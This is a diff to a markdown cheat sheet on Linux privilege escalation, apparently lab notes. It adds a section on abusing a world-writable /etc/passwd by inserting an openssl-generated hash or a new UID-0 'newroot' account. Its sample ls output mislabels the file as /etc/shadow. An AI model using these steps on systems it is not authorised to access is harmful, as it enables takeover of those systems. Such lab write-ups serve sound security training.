@@ -55,7 +55,7 @@ Switch to the root user, using the cracked password:
 
     su root
 
-#### 😍Happy Hacking 
+#### 😍Happy Hacking 😍
 
 # 02: writeable /etc/shadow 
 
@@ -88,4 +88,63 @@ Switch to the root user, using the new password:
 
 su root
 
-#### 😍Happy Hacking   (-_-)
+#### 😍Happy Hacking 😍
+
+
+# 🔥03:Writable /etc/passwd :
+
+#### ⏰The /etc/passwd file contains information about user accounts. It is world-readable, but usually only writable by the root user. Historically, the /etc/passwd file contained user password hashes, and some versions of Linux will still allow password hashes to be stored there.
+
+Note that the /etc/passwd file is world-writable:
+
+At first check permission of /etc/passwd file using :
+
+     ls -l /etc/passwd
+
+    -rw-r--rw- 1 root passwd 842 Apr  9 17:28 /etc/shadow
+
+
+#### 🧑Generate a new password hash with a password of your choice:
+
+    openssl passwd newpasswordhere
+
+#### 👀Edit the /etc/passwd file and place the generated password hash between the first and second colon (:) of the root user's row (replacing the "x").
+
+Switch to the root user, using the new password:
+
+    su root
+
+#### 👁️ Alternatively, copy the root user's row and append it to the bottom of the file, changing the first instance of the word "root" to "newroot" and placing the generated password hash between the first and second colon (replacing the "x").
+
+          user@debian:~$ cat /etc/passwd
+          root:x:0:0:root:/root:/bin/bash
+          daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+          bin:x:2:2:bin:/bin:/bin/sh
+          sys:x:3:3:sys:/dev:/bin/sh
+          sync:x:4:65534:sync:/bin:/bin/sync
+          games:x:5:60:games:/usr/games:/bin/sh
+          man:x:6:12:man:/var/cache/man:/bin/sh
+          lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+          mail:x:8:8:mail:/var/mail:/bin/sh
+          news:x:9:9:news:/var/spool/news:/bin/sh
+          uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+          proxy:x:13:13:proxy:/bin:/bin/sh
+          www-data:x:33:33:www-data:/var/www:/bin/sh
+          backup:x:34:34:backup:/var/backups:/bin/sh
+          list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+          irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+          gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+          nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+          libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+          Debian-exim:x:101:103::/var/spool/exim4:/bin/false
+          sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+          user:x:1000:1000:user,,,:/home/user:/bin/bash
+          statd:x:103:65534::/var/lib/nfs:/bin/false
+          mysql:x:104:106:MySQL Server,,,:/var/lib/mysql:/bin/false
+
+
+Now switch to the newroot user, using the new password:
+
+    su newroot
+    
+#### 😍Happy Hacking 😍    
